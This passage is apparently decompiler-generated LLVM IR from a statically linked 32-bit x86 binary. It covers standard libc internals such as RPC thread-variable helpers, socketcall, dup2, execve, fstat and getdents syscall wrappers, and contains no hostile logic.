  %v0_8060e69 = load i32, i32* @ebx, align 4
  %v1_8060e69 = add i32 %v0_8060e69, 1
  store i32 %v1_8060e69, i32* @ebx, align 4
  %v1_8060e6a.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_8060e6a = icmp ult i32 %v1_8060e69, %v1_8060e6a.pre
  br i1 %v7_8060e6a, label %dec_label_pc_8060e62, label %dec_label_pc_8060e6e

dec_label_pc_8060e6e:                             ; preds = %dec_label_pc_8060e62, %dec_label_pc_8060e4a
  store i32 134567682, i32* %eax.global-to-local, align 4
  %v0_8060e77 = load i32, i32* %stack_var_-160, align 4
  %v1_8060e77 = call i32 @__errno_location(i32 %v0_8060e77)
  %v1_8060e7c = inttoptr i32 %v1_8060e77 to i32*
  store i32 0, i32* %v1_8060e7c, align 4
  store i32 134567667, i32* %eax.global-to-local, align 4
  %v0_8060e8b = call i32 @__h_errno_location()
  store i32 %v0_8060e8b, i32* %eax.global-to-local, align 4
  %v1_8060e90 = inttoptr i32 %v0_8060e8b to i32*
  store i32 0, i32* %v1_8060e90, align 4
  %v0_8060e96 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8060e96, i32* %stack_var_-160, align 4
  %v0_8060e9d = load i32, i32* @edi, align 4
  store i32 %v0_8060e9d, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %arg1)
  %v0_8060eac = load i32, i32* %eax.global-to-local, align 4
  %v1_8060eaf = call i32 @__GI_exit(i32 %v0_8060eac)
  store i32 %v1_8060eaf, i32* %eax.global-to-local, align 4
  ret i32 %v1_8060eaf

; uselistorder directives
  uselistorder i32 %v1_8060e69, { 1, 2, 0 }
  uselistorder i32 %v1_8060e45, { 1, 2, 0 }
  uselistorder i32 %v2_8060d85, { 1, 0 }
  uselistorder i32 %v1_8060d82, { 2, 1, 0 }
  uselistorder i32 %v1_8060d75, { 0, 2, 1 }
  uselistorder i32 %v1_8060d61, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v0_8060d5e, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i32 %tmp25, { 1, 0, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 3, 5, 6, 7, 4, 8, 9, 0, 2, 17, 18, 20, 19, 1, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_806f000.825 to i32), i32 -134672384), i32 2), { 0, 2, 3, 1 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_806f000.825 to i32), i32 -134672384), { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_806f000.825 to i32), { 2, 3, 0, 4, 5, 1 }
  uselistorder i32 ()* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_8060e62, { 1, 0 }
  uselistorder label %dec_label_pc_8060e3e, { 1, 0 }
  uselistorder label %dec_label_pc_8060e19, { 1, 0 }
  uselistorder label %dec_label_pc_8060da4, { 1, 0 }
  uselistorder label %dec_label_pc_8060d82, { 1, 0 }
  uselistorder label %dec_label_pc_8060d6a, { 1, 0 }
  uselistorder label %dec_label_pc_8060d47, { 1, 0 }
}

define i32 @rpc_thread_multi() local_unnamed_addr {
dec_label_pc_8060edd:
  %v4_8060ec9 = call i32 @__pthread_internal_tsd_set(i32 2, i32 ptrtoint (i32* @global_var_807c900.834 to i32), i32 134574559, i32 134574559)
  ret i32 %v4_8060ec9
}

define i32 @__rpc_thread_variables(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8060ee1 = load i32, i32* @ebx, align 4
  %v1_8060ef3 = call i32 @__pthread_internal_tsd_get(i32 2)
  store i32 %v1_8060ef3, i32* @ebx, align 4
  %v1_8060f04 = icmp eq i32 %v1_8060ef3, 0
  %v1_8060f06 = icmp eq i1 %v1_8060f04, false
  br i1 %v1_8060f06, label %dec_label_pc_8060fbc, label %dec_label_pc_8060f0c

dec_label_pc_8060f0c:                             ; preds = %entry
  %v5_8060f21 = call i32 @pthread_once(i32* nonnull @global_var_807c8e0.836, i32 134614708, i32 134584116, i32 134584116)
  %v1_8060f51 = call i32 @__pthread_internal_tsd_get(i32 2)
  store i32 %v1_8060f51, i32* @ebx, align 4
  %v1_8060f62 = icmp eq i32 %v1_8060f51, 0
  %v1_8060f64 = icmp eq i1 %v1_8060f62, false
  br i1 %v1_8060f64, label %dec_label_pc_8060fbc, label %dec_label_pc_8060f66

dec_label_pc_8060f66:                             ; preds = %dec_label_pc_8060f0c
  %v3_8060f6f = call i32 @calloc(i64 1, i32 200)
  store i32 %v3_8060f6f, i32* %ebx.global-to-local, align 4
  %v1_8060f79 = icmp eq i32 %v3_8060f6f, 0
  br i1 %v1_8060f79, label %dec_label_pc_8060f9d, label %dec_label_pc_8060f7d

dec_label_pc_8060f7d:                             ; preds = %dec_label_pc_8060f66
  %v4_8060f8b = call i32 @__pthread_internal_tsd_set(i32 2, i32 %v3_8060f6f, i32 134574559, i32 134574559)
  %v0_8060fbc.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8060fbc

dec_label_pc_8060f9d:                             ; preds = %dec_label_pc_8060f66
  %v1_8060fab = call i32 @__pthread_internal_tsd_get(i32 2)
  store i32 %v1_8060fab, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8060fbc

dec_label_pc_8060fbc:                             ; preds = %dec_label_pc_8060f0c, %entry, %dec_label_pc_8060f7d, %dec_label_pc_8060f9d
  %v0_8060fbc = phi i32 [ %v1_8060f51, %dec_label_pc_8060f0c ], [ %v1_8060ef3, %entry ], [ %v0_8060fbc.pre, %dec_label_pc_8060f7d ], [ %v1_8060fab, %dec_label_pc_8060f9d ]
  %v2_8060fbe = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8060fbe, i32* @edx, align 4
  store i32 %v0_8060ee1, i32* @ebx, align 4
  ret i32 %v0_8060fbc

; uselistorder directives
  uselistorder i32 %v3_8060f6f, { 0, 2, 1 }
  uselistorder i32 %v1_8060f51, { 0, 2, 1 }
  uselistorder i32 %v1_8060ef3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8060fbc, { 3, 2, 0, 1 }
}

define i32 @__rpc_thread_svc_max_pollfd() local_unnamed_addr {
entry:
  %v1_8060fc5 = call i32 @__rpc_thread_variables(i32 ptrtoint (i32* @0 to i32))
  %v6_8060fcf = icmp eq i32 %v1_8060fc5, 134727936
  br i1 %v6_8060fcf, label %dec_label_pc_8060fdc, label %dec_label_pc_8060fd6

dec_label_pc_8060fd6:                             ; preds = %entry
  %v1_8060fd6 = add i32 %v1_8060fc5, 148
  br label %dec_label_pc_8060fdc

dec_label_pc_8060fdc:                             ; preds = %entry, %dec_label_pc_8060fd6
  %v0_8060fdc = phi i32 [ ptrtoint (i32* @global_var_807e52c.837 to i32), %entry ], [ %v1_8060fd6, %dec_label_pc_8060fd6 ]
  ret i32 %v0_8060fdc

; uselistorder directives
  uselistorder i32 %v1_8060fc5, { 1, 0 }
  uselistorder label %dec_label_pc_8060fdc, { 1, 0 }
}

define i32 @__rpc_thread_svc_pollfd() local_unnamed_addr {
entry:
  %v1_8060fe5 = call i32 @__rpc_thread_variables(i32 ptrtoint (i32* @0 to i32))
  %v6_8060fef = icmp eq i32 %v1_8060fe5, 134727936
  br i1 %v6_8060fef, label %dec_label_pc_8060ffc, label %dec_label_pc_8060ff6

dec_label_pc_8060ff6:                             ; preds = %entry
  %v1_8060ff6 = add i32 %v1_8060fe5, 144
  br label %dec_label_pc_8060ffc

dec_label_pc_8060ffc:                             ; preds = %entry, %dec_label_pc_8060ff6
  %v0_8060ffc = phi i32 [ ptrtoint (i32* @global_var_807e540.838 to i32), %entry ], [ %v1_8060ff6, %dec_label_pc_8060ff6 ]
  ret i32 %v0_8060ffc

; uselistorder directives
  uselistorder i32 %v1_8060fe5, { 1, 0 }
  uselistorder label %dec_label_pc_8060ffc, { 1, 0 }
}

define i32 @__GI___rpc_thread_createerr() local_unnamed_addr {
entry:
  %v1_8061005 = call i32 @__rpc_thread_variables(i32 ptrtoint (i32* @0 to i32))
  %v6_806100f = icmp eq i32 %v1_8061005, 134727936
  br i1 %v6_806100f, label %dec_label_pc_806101c, label %dec_label_pc_8061016

dec_label_pc_8061016:                             ; preds = %entry
  %v1_8061016 = add i32 %v1_8061005, 128
  br label %dec_label_pc_806101c

dec_label_pc_806101c:                             ; preds = %entry, %dec_label_pc_8061016
  %storemerge = phi i32 [ %v1_8061016, %dec_label_pc_8061016 ], [ ptrtoint (i32* @global_var_807e530.839 to i32), %entry ]
  %v0_806101c = phi i32 [ %v1_8061016, %dec_label_pc_8061016 ], [ ptrtoint (i32* @global_var_807e530.839 to i32), %entry ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_806101c

; uselistorder directives
  uselistorder i32 %v1_8061005, { 1, 0 }
  uselistorder label %dec_label_pc_806101c, { 1, 0 }
}

define i32 @__GI___rpc_thread_svc_fdset() local_unnamed_addr {
entry:
  %v1_8061025 = call i32 @__rpc_thread_variables(i32 ptrtoint (i32* @0 to i32))
  %v6_806102f = icmp eq i32 %v1_8061025, 134727936
  br i1 %v6_806102f, label %dec_label_pc_8061038, label %dec_label_pc_8061036

dec_label_pc_8061036:                             ; preds = %entry
  br label %dec_label_pc_8061038

dec_label_pc_8061038:                             ; preds = %entry, %dec_label_pc_8061036
  %v0_8061038 = phi i32 [ ptrtoint (i32* @global_var_807e4a0.840 to i32), %entry ], [ %v1_8061025, %dec_label_pc_8061036 ]
  ret i32 %v0_8061038

; uselistorder directives
  uselistorder i32 %v1_8061025, { 1, 0 }
  uselistorder label %dec_label_pc_8061038, { 1, 0 }
}

define i32 @__rpc_thread_destroy() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v1_8061050 = call i32 @__pthread_internal_tsd_get(i32 2)
  store i32 %v1_8061050, i32* @ebx, align 4
  %v1_8061062 = icmp eq i32 %v1_8061050, 0
  br i1 %v1_8061062, label %dec_label_pc_80610f8, label %dec_label_pc_806106a

dec_label_pc_806106a:                             ; preds = %entry
  %v6_806106a = icmp eq i32 %v1_8061050, 134727936
  br i1 %v6_806106a, label %dec_label_pc_80610f8, label %dec_label_pc_8061076

dec_label_pc_8061076:                             ; preds = %dec_label_pc_806106a
  %v0_8061076 = call i32 @__rpc_thread_svc_cleanup()
  %v0_806107b = call i32 @__rpc_thread_clnt_cleanup()
  %v0_8061083 = load i32, i32* @ebx, align 4
  %v1_8061083 = add i32 %v0_8061083, 152
  %v2_8061083 = inttoptr i32 %v1_8061083 to i32*
  %v3_8061083 = load i32, i32* %v2_8061083, align 4
  %v1_8061089 = call i32 @free(i32 %v3_8061083)
  %v0_806108f = load i32, i32* @ebx, align 4
  %v1_806108f = add i32 %v0_806108f, 156
  %v2_806108f = inttoptr i32 %v1_806108f to i32*
  %v3_806108f = load i32, i32* %v2_806108f, align 4
  %v1_8061095 = call i32 @free(i32 %v3_806108f)
  %v0_806109b = load i32, i32* @ebx, align 4
  %v1_806109b = add i32 %v0_806109b, 160
  %v2_806109b = inttoptr i32 %v1_806109b to i32*
  %v3_806109b = load i32, i32* %v2_806109b, align 4
  %v1_80610a1 = call i32 @free(i32 %v3_806109b)
  %v0_80610a7 = load i32, i32* @ebx, align 4
  %v1_80610a7 = add i32 %v0_80610a7, 188
  %v2_80610a7 = inttoptr i32 %v1_80610a7 to i32*
  %v3_80610a7 = load i32, i32* %v2_80610a7, align 4
  %v1_80610ad = call i32 @free(i32 %v3_80610a7)
  %v0_80610b3 = load i32, i32* @ebx, align 4
  %v1_80610b3 = add i32 %v0_80610b3, 172
  %v2_80610b3 = inttoptr i32 %v1_80610b3 to i32*
  %v3_80610b3 = load i32, i32* %v2_80610b3, align 4
  %v1_80610b9 = call i32 @free(i32 %v3_80610b3)
  %v0_80610bf = load i32, i32* @ebx, align 4
  %v1_80610bf = add i32 %v0_80610bf, 176
  %v2_80610bf = inttoptr i32 %v1_80610bf to i32*
  %v3_80610bf = load i32, i32* %v2_80610bf, align 4
  %v1_80610c5 = call i32 @free(i32 %v3_80610bf)
  %v0_80610ca = load i32, i32* @ebx, align 4
  %v1_80610cd = call i32 @free(i32 %v0_80610ca)
  %v0_80610de = load i32, i32* @ecx, align 4
  %v4_80610e4 = call i32 @__pthread_internal_tsd_set(i32 2, i32 0, i32 %v0_80610de, i32 %v0_80610de)
  br label %dec_label_pc_80610f8

dec_label_pc_80610f8:                             ; preds = %dec_label_pc_806106a, %entry, %dec_label_pc_8061076
  %v2_80610f8 = load i32, i32* %stack_var_-12, align 4
  ret i32 %v2_80610f8

; uselistorder directives
  uselistorder i32 %v1_8061050, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__pthread_internal_tsd_set, { 1, 2, 0 }
  uselistorder i32 188, { 2, 0, 1 }
  uselistorder i32 (i32)* @__pthread_internal_tsd_get, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_80610f8, { 2, 0, 1 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v1_8061103 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v0_8061108 = load i32, i32* @edx, align 4
  %v2_8061108 = inttoptr i32 %v1_8061103 to i32*
  store i32 %v0_8061108, i32* %v2_8061108, align 4
  ret i32 -1
}

define i32 @__longjmp(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg1 to i32
  %v1_806111c = add i32 %tmp2, 20
  %v2_806111c = inttoptr i32 %v1_806111c to i32*
  %v3_806111c = load i32, i32* %v2_806111c, align 4
  call void @__pseudo_branch(i32 %v3_806111c)
  ret i32 %arg2
}

define i32 @__vfork(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ecx, align 4
  %v0_8061136 = call i32 @vfork()
  %v5_8061139 = icmp ult i32 %v0_8061136, -4095
  %v1_806113e = icmp eq i1 %v5_8061139, false
  call void @__pseudo_cond_branch(i1 %v1_806113e, i32 134615292)
  ret i32 %v0_8061136
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8061148 = load i32, i32* @ebx, align 4
  store i32 %v0_8061148, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_806115b = call i32 @int80_syscall(i32 102)
  store i32 %v1_806115b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_806115b, -4095
  br i1 %tmp, label %dec_label_pc_8061174, label %dec_label_pc_8061168

dec_label_pc_8061168:                             ; preds = %entry
  %v0_8061168 = load i32, i32* %stack_var_-4, align 4
  %v1_8061168 = call i32 @__errno_location(i32 %v0_8061168)
  %v0_806116d = load i32, i32* %ebx.global-to-local, align 4
  %v1_806116d = sub i32 0, %v0_806116d
  %v2_806116f = inttoptr i32 %v1_8061168 to i32*
  store i32 %v1_806116d, i32* %v2_806116f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061174

dec_label_pc_8061174:                             ; preds = %entry, %dec_label_pc_8061168
  %v0_8061174 = phi i32 [ %v1_806115b, %entry ], [ -1, %dec_label_pc_8061168 ]
  %v2_8061176 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8061176, i32* @edx, align 4
  %v2_8061178 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8061178, i32* @ebx, align 4
  ret i32 %v0_8061174

; uselistorder directives
  uselistorder i32 %v1_806115b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8061174, { 1, 0 }
}

define i32 @__GI_clock_getres(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_806117c = load i32, i32* @ebx, align 4
  store i32 %v0_806117c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_806118f = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_806118f, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_806118f, -4095
  br i1 %tmp, label %dec_label_pc_80611a8, label %dec_label_pc_806119c

dec_label_pc_806119c:                             ; preds = %entry
  %v0_806119c = load i32, i32* %stack_var_-4, align 4
  %v1_806119c = call i32 @__errno_location(i32 %v0_806119c)
  %v0_80611a1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80611a1 = sub i32 0, %v0_80611a1
  %v2_80611a3 = inttoptr i32 %v1_806119c to i32*
  store i32 %v1_80611a1, i32* %v2_80611a3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80611a8

dec_label_pc_80611a8:                             ; preds = %entry, %dec_label_pc_806119c
  %v0_80611a8 = phi i32 [ %v4_806118f, %entry ], [ -1, %dec_label_pc_806119c ]
  %v2_80611ac = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80611ac, i32* @ebx, align 4
  ret i32 %v0_80611a8

; uselistorder directives
  uselistorder i32 %v4_806118f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80611a8, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_80611b0 = load i32, i32* @ebx, align 4
  store i32 %v0_80611b0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_80611c3 = call i32 @dup2(i32 %v0_80611b0, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_80611c3, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_80611c3, -4095
  br i1 %tmp, label %dec_label_pc_80611dc, label %dec_label_pc_80611d0

dec_label_pc_80611d0:                             ; preds = %entry
  %v0_80611d0 = load i32, i32* %stack_var_-4, align 4
  %v1_80611d0 = call i32 @__errno_location(i32 %v0_80611d0)
  %v0_80611d5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80611d5 = sub i32 0, %v0_80611d5
  %v2_80611d7 = inttoptr i32 %v1_80611d0 to i32*
  store i32 %v1_80611d5, i32* %v2_80611d7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80611dc

dec_label_pc_80611dc:                             ; preds = %entry, %dec_label_pc_80611d0
  %v0_80611dc = phi i32 [ %v4_80611c3, %entry ], [ -1, %dec_label_pc_80611d0 ]
  %v2_80611e0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80611e0, i32* @ebx, align 4
  ret i32 %v0_80611dc

; uselistorder directives
  uselistorder i32 %v4_80611c3, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @dup2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80611dc, { 1, 0 }
}

define i32 @__GI_execve(i8* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_3()
  %tmp5 = call i8* @__decompiler_undefined_function_3()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80611e4 = load i32, i32* @edi, align 4
  store i32 %v0_80611e4, i32* %stack_var_-4, align 4
  %v4_80611e8 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80611e8, i32* %edi.global-to-local, align 4
  %v0_80611f4 = load i32, i32* @ebx, align 4
  %v5_80611fc = insertvalue [1 x i8*] undef, i8* %tmp5, 0
  %v8_80611fc = insertvalue [1 x i8*] undef, i8* %tmp, 0
  %v9_80611fc = call i32 @execve(i8* %arg1, [1 x i8*] %v5_80611fc, [1 x i8*] %v8_80611fc)
  store i32 %v9_80611fc, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v9_80611fc, -4095
  br i1 %tmp12, label %dec_label_pc_8061214, label %dec_label_pc_8061208

dec_label_pc_8061208:                             ; preds = %entry
  %v1_8061208 = call i32 @__errno_location(i32 %v0_80611f4)
  %v0_806120d = load i32, i32* %edi.global-to-local, align 4
  %v1_806120d = sub i32 0, %v0_806120d
  %v2_806120f = inttoptr i32 %v1_8061208 to i32*
  store i32 %v1_806120d, i32* %v2_806120f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8061214

dec_label_pc_8061214:                             ; preds = %entry, %dec_label_pc_8061208
  %v0_8061214 = phi i32 [ %v9_80611fc, %entry ], [ -1, %dec_label_pc_8061208 ]
  %v2_8061216 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8061216, i32* @edx, align 4
  %v2_8061218 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8061218, i32* %edi.global-to-local, align 4
  ret i32 %v0_8061214

; uselistorder directives
  uselistorder i32 %v9_80611fc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8061214, { 1, 0 }
}

define i32 @fstat(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_806121c = load i32, i32* @ebx, align 4
  store i32 %v0_806121c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_806122f = call i32 @fstat(i32 %v0_806121c, i32 %tmp3, i32 %arg1, i32 %arg2)
  store i32 %v4_806122f, i32* @ebx, align 4
  %tmp = icmp ult i32 %v4_806122f, -4095
  br i1 %tmp, label %dec_label_pc_806124a, label %dec_label_pc_806123c

dec_label_pc_806123c:                             ; preds = %entry
  %v0_806123c = load i32, i32* %stack_var_-4, align 4
  %v1_806123c = call i32 @__errno_location(i32 %v0_806123c)
  %v0_8061241 = load i32, i32* @ebx, align 4
  %v1_8061241 = sub i32 0, %v0_8061241
  %v2_8061243 = inttoptr i32 %v1_806123c to i32*
  store i32 %v1_8061241, i32* %v2_8061243, align 4
  br label %dec_label_pc_806125d

dec_label_pc_806124a:                             ; preds = %entry
  %v1_806124a = icmp eq i32 %v4_806122f, 0
  %v1_806124c = icmp eq i1 %v1_806124a, false
  br i1 %v1_806124c, label %dec_label_pc_806125d, label %dec_label_pc_806124e

dec_label_pc_806124e:                             ; preds = %dec_label_pc_806124a
  %v4_8061255 = bitcast i32* %stack_var_-68 to i16*
  %v5_8061255 = call i32 @__xstat_conv(i16* %v4_8061255, i32 %arg2, i32 %v4_806122f, i32 %v4_806122f)
  %v0_806125d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_806125d

dec_label_pc_806125d:                             ; preds = %dec_label_pc_806124a, %dec_label_pc_806123c, %dec_label_pc_806124e
  %v0_806125d = phi i32 [ %v4_806122f, %dec_label_pc_806124a ], [ -1, %dec_label_pc_806123c ], [ %v0_806125d.pre, %dec_label_pc_806124e ]
  %v2_8061262 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8061262, i32* @ebx, align 4
  ret i32 %v0_806125d

; uselistorder directives
  uselistorder i32 %v4_806122f, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @fstat, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_806125d, { 2, 0, 1 }
}

define i32 @__getdents(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_8061264 = load i32, i32* @edi, align 4
  %v0_8061265 = load i32, i32* @esi, align 4
  %v0_8061266 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v0_806126b = load i32, i32* @edx, align 4
  %v7_8061275 = inttoptr i32 %arg2 to i32*
  %v8_8061275 = call i32 @__getdents64(i32 %arg1, i32* %v7_8061275, i32 %arg3, i32 %v0_806126b, i32 %v0_8061266, i32 %v0_8061265, i32 %v0_8061264)
  store i32 %v8_8061275, i32* %eax.global-to-local, align 4
  store i32 %v8_8061275, i32* @esi, align 4
  %tmp14 = icmp slt i32 %v8_8061275, 1
  br i1 %tmp14, label %dec_label_pc_80612cd, label %dec_label_pc_8061283

dec_label_pc_8061283:                             ; preds = %entry
  %v0_8061283 = load i32, i32* @ebx, align 4
  %v2_8061283 = add i32 %v0_8061283, %v8_8061275
  store i32 %v2_8061283, i32* @edi, align 4
  %v7_80612c917 = icmp ult i32 %v0_8061283, %v2_8061283
  br i1 %v7_80612c917, label %dec_label_pc_8061288, label %dec_label_pc_80612cd

dec_label_pc_8061288:                             ; preds = %dec_label_pc_8061283, %dec_label_pc_8061288
  %v0_806128823 = phi i32 [ %v2_80612c7, %dec_label_pc_8061288 ], [ %v0_8061283, %dec_label_pc_8061283 ]
  %v1_8061288 = add i32 %v0_806128823, 8
  %v2_8061288 = inttoptr i32 %v1_8061288 to i32*
  %v3_8061288 = load i32, i32* %v2_8061288, align 4
  store i32 %v3_8061288, i32* %eax.global-to-local, align 4
  %v2_806128b = add i32 %v0_806128823, 4
  %v3_806128b = inttoptr i32 %v2_806128b to i32*
  store i32 %v3_8061288, i32* %v3_806128b, align 4
  %v0_806128e = load i32, i32* @ebx, align 4
  %v1_806128e = add i32 %v0_806128e, 16
  %v2_806128e = inttoptr i32 %v1_806128e to i32*
  %v3_806128e = load i32, i32* %v2_806128e, align 4
  store i32 %v3_806128e, i32* %eax.global-to-local, align 4
  %v1_8061291 = trunc i32 %v3_806128e to i16
  %v3_8061291 = add i32 %v0_806128e, 8
  %v4_8061291 = inttoptr i32 %v3_8061291 to i16*
  store i16 %v1_8061291, i16* %v4_8061291, align 2
  %v0_8061295 = load i32, i32* @ebx, align 4
  %v1_8061295 = add i32 %v0_8061295, 18
  %v2_8061295 = inttoptr i32 %v1_8061295 to i8*
  %v3_8061295 = load i8, i8* %v2_8061295, align 1
  %v4_8061295 = zext i8 %v3_8061295 to i32
  %v5_8061295 = load i32, i32* %eax.global-to-local, align 4
  %v6_8061295 = and i32 %v5_8061295, -256
  %v7_8061295 = or i32 %v6_8061295, %v4_8061295
  store i32 %v7_8061295, i32* %eax.global-to-local, align 4
  %v3_8061298 = add i32 %v0_8061295, 10
  %v4_8061298 = inttoptr i32 %v3_8061298 to i8*
  store i8 %v3_8061295, i8* %v4_8061298, align 1
  %v0_806129c = load i32, i32* @ebx, align 4
  %v1_80612a4 = add i32 %v0_806129c, 19
  %v1_80612a8 = add i32 %v0_806129c, 11
  store i32 %v1_80612a8, i32* %eax.global-to-local, align 4
  %v3_80612ac = inttoptr i32 %v1_80612a8 to i8*
  %v4_80612ac = call i32 @memmove(i8* %v3_80612ac, i32 %v1_80612a4)
  store i32 %v4_80612ac, i32* %eax.global-to-local, align 4
  %v0_80612b4 = load i32, i32* @ebx, align 4
  %v1_80612b4 = add i32 %v0_80612b4, 8
  %v2_80612b4 = inttoptr i32 %v1_80612b4 to i16*
  %v3_80612b4 = load i16, i16* %v2_80612b4, align 2
  %v4_80612b4 = zext i16 %v3_80612b4 to i32
  store i32 %v4_80612b4, i32* %eax.global-to-local, align 4
  %v3_80612bb = inttoptr i32 %v0_80612b4 to i8*
  %v4_80612bb = call i32 @memmove(i8* %v3_80612bb, i32 %v0_80612b4)
  store i32 %v4_80612bb, i32* %eax.global-to-local, align 4
  %v0_80612c0 = load i32, i32* @ebx, align 4
  %v1_80612c0 = add i32 %v0_80612c0, 8
  %v2_80612c0 = inttoptr i32 %v1_80612c0 to i16*
  %v3_80612c0 = load i16, i16* %v2_80612c0, align 2
  %v4_80612c0 = zext i16 %v3_80612c0 to i32
  store i32 %v4_80612c0, i32* %eax.global-to-local, align 4
  %v2_80612c7 = add i32 %v4_80612c0, %v0_80612c0
  store i32 %v2_80612c7, i32* @ebx, align 4
  %v1_80612c9.pre = load i32, i32* @edi, align 4
  %v7_80612c9 = icmp ult i32 %v2_80612c7, %v1_80612c9.pre
  br i1 %v7_80612c9, label %dec_label_pc_8061288, label %dec_label_pc_80612c9.dec_label_pc_80612cd.loopexit_crit_edge

dec_label_pc_80612c9.dec_label_pc_80612cd.loopexit_crit_edge: ; preds = %dec_label_pc_8061288
  %v0_80612cd.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80612cd

dec_label_pc_80612cd:                             ; preds = %dec_label_pc_8061283, %dec_label_pc_80612c9.dec_label_pc_80612cd.loopexit_crit_edge, %entry
  %v0_80612cd = phi i32 [ %v8_8061275, %entry ], [ %v0_80612cd.pre.pre, %dec_label_pc_80612c9.dec_label_pc_80612cd.loopexit_crit_edge ], [ %v8_8061275, %dec_label_pc_8061283 ]
  store i32 %v0_80612cd, i32* %eax.global-to-local, align 4
  store i32 %v0_8061265, i32* @esi, align 4
  store i32 %v0_8061264, i32* @edi, align 4
  ret i32 %v0_80612cd

; uselistorder directives
  uselistorder i32 %v0_80612cd, { 1, 0 }
  uselistorder i32 %v2_80612c7, { 1, 2, 0 }
